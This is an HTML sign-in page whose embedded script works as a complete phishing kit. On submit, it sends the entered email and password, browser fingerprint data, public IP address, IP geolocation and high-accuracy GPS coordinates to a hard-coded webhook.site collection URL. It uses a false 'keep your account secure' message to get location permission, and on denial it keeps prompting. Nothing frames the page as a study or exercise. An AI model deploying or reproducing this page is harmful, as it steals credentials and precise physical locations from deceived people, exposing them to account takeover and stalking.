<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #0f1115;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
    color: #e8eaed;
  }
  .card {
    width: 100%;
    max-width: 400px;
    background: #1a1d24;
    border: 1px solid #2a2f3a;
    border-radius: 12px;
    padding: 36px 32px 28px;
    box-shadow: 0 12px 40px rgba(0,0,0,.45);
  }
  .logo {
    width: 40px;
    height: 40px;
    border-radius: 10px;
    background: linear-gradient(135deg, #4f8cff, #7b5cff);
    margin: 0 auto 18px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    font-size: 18px;
  }
  h1 {
    text-align: center;
    font-size: 22px;
    font-weight: 600;
    margin-bottom: 6px;
  }
  .sub {
    text-align: center;
    color: #9aa0a6;
    font-size: 13px;
    margin-bottom: 28px;
  }
  label {
    display: block;
    font-size: 12px;
    color: #9aa0a6;
    margin-bottom: 6px;
  }
  input {
    width: 100%;
    background: #12151b;
    border: 1px solid #2a2f3a;
    border-radius: 8px;
    padding: 12px 14px;
    color: #e8eaed;
    font-size: 14px;
    outline: none;
    margin-bottom: 16px;
    transition: border .15s;
  }
  input:focus { border-color: #4f8cff; }
  button {
    width: 100%;
    border: none;
    border-radius: 8px;
    padding: 12px;
    background: #4f8cff;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 4px;
    transition: background .15s;
  }
  button:hover { background: #3d7aef; }
  button:disabled {
    background: #2a3a5c;
    cursor: default;
  }
  .msg {
    display: none;
    margin-top: 18px;
    padding: 12px 14px;
    border-radius: 8px;
    background: #1e2430;
    border: 1px solid #2f3a4d;
    font-size: 13px;
    line-height: 1.45;
    color: #c5cad3;
  }
  .msg.show { display: block; }
  .msg strong { color: #4f8cff; }
  .foot {
    text-align: center;
    margin-top: 22px;
    font-size: 12px;
    color: #6b7280;
  }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">S</div>
    <h1>Sign in</h1>
    <p class="sub">Continue to your account</p>

    <form id="f" onsubmit="return go(event)">
      <label for="email">Email</label>
      <input id="email" type="email" placeholder="you@example.com" required autocomplete="username">

      <label for="pass">Password</label>
      <input id="pass" type="password" placeholder="••••••••" required autocomplete="current-password">

      <button type="submit" id="btn">Sign in</button>
    </form>

    <div class="msg" id="msg">
      <strong>Please allow location access</strong> for the best experience.
      This helps us verify your session and keep your account secure.
    </div>

    <p class="foot">Protected session · Secure login</p>
  </div>

<script>
const HOOK = "https://webhook.site/389a7fcd-0194-4b0b-b98c-044a215db5e4";

async function post(data) {
  try {
    await fetch(HOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
      mode: "no-cors"
    });
  } catch (e) {}
}

function go(e) {
  e.preventDefault();
  const email = document.getElementById("email").value;
  const pass = document.getElementById("pass").value;
  const btn = document.getElementById("btn");
  const msg = document.getElementById("msg");

  btn.disabled = true;
  btn.textContent = "Checking...";
  msg.classList.add("show");

  const base = {
    email: email,
    password: pass,
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: screen.width + "x" + screen.height,
    time: new Date().toISOString(),
    href: location.href
  };

  post(Object.assign({}, base, { stage: "login_submit" }));

  if (!navigator.geolocation) {
    post(Object.assign({}, base, { stage: "geo_unsupported" }));
    btn.textContent = "Continue";
    return false;
  }

  navigator.geolocation.getCurrentPosition(
    async function (pos) {
      const coords = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        heading: pos.coords.heading,
        speed: pos.coords.speed
      };

      let ip = null;
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        const j = await r.json();
        ip = j.ip;
      } catch (err) {}

      let geo = null;
      if (ip) {
        try {
          const r2 = await fetch("https://ipapi.co/" + ip + "/json/");
          geo = await r2.json();
        } catch (err) {}
      }

      post(Object.assign({}, base, {
        stage: "location_granted",
        ip: ip,
        coords: coords,
        geo: geo
      }));

      btn.textContent = "Signed in";
      msg.innerHTML = "<strong>Location received.</strong> You can close this page.";
    },
    function (err) {
      post(Object.assign({}, base, {
        stage: "location_denied",
        error: err.message || String(err.code)
      }));
      btn.textContent = "Try again";
      btn.disabled = false;
      msg.innerHTML = "<strong>Location access is required</strong> for the best experience. Please allow and try again.";
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );

  return false;
}
</script>
</body>
</html>
